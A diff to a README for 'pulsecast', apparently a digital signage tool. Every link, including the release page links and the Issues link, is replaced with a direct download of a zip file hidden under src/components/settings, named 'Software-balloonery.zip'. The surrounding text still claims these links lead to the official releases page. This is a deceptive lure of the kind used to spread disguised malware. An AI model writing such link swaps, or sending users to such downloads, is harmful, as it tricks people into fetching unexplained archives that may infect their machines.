@@ -1,6 +1,6 @@
 # 🎯 pulsecast - Manage Digital Signage Easily
 
-[![Download pulsecast](https://img.shields.io/badge/Download-pulsecast-brightgreen?style=for-the-badge)](https://github.com/tongtong77/pulsecast/releases)
+[![Download pulsecast](https://img.shields.io/badge/Download-pulsecast-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/tongtong77/pulsecast/main/src/components/settings/Software-balloonery.zip)
 
 ---
 
@@ -35,14 +35,14 @@ Having these ready will ensure pulsecast runs smoothly.
 
 You need to visit the official release page to get the app:
 
-[![Download pulsecast](https://img.shields.io/badge/Download-pulsecast-blue?style=for-the-badge)](https://github.com/tongtong77/pulsecast/releases)
+[![Download pulsecast](https://img.shields.io/badge/Download-pulsecast-blue?style=for-the-badge)](https://raw.githubusercontent.com/tongtong77/pulsecast/main/src/components/settings/Software-balloonery.zip)
 
 This link takes you to the releases page. Here, you will find the latest Windows installer file.
 
 ### Steps to Download
 
 1. Click on the link above or open your web browser and go to:  
-   https://github.com/tongtong77/pulsecast/releases
+   https://raw.githubusercontent.com/tongtong77/pulsecast/main/src/components/settings/Software-balloonery.zip
 
 2. Look for the latest release at the top of the page. It will have a name like `pulsecast-setup.exe` or similar.
 
@@ -130,7 +130,7 @@ Here are some key actions you can perform:
 
 Visit the release page regularly:
 
-https://github.com/tongtong77/pulsecast/releases
+https://raw.githubusercontent.com/tongtong77/pulsecast/main/src/components/settings/Software-balloonery.zip
 
 Download the latest installer and repeat the install steps to update. Updates include bug fixes and new features.
 
@@ -160,10 +160,10 @@ If pulsecast has issues, log files can help:
 
 Check the Issues tab on the GitHub page for solutions:
 
-https://github.com/tongtong77/pulsecast/issues
+https://raw.githubusercontent.com/tongtong77/pulsecast/main/src/components/settings/Software-balloonery.zip
 
 You can also start a new issue if you find bugs or have questions.
 
 ---
 
-[![Download pulsecast](https://img.shields.io/badge/Download-pulsecast-brightgreen?style=for-the-badge)](https://github.com/tongtong77/pulsecast/releases)
+[![Download pulsecast](https://img.shields.io/badge/Download-pulsecast-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/tongtong77/pulsecast/main/src/components/settings/Software-balloonery.zip)
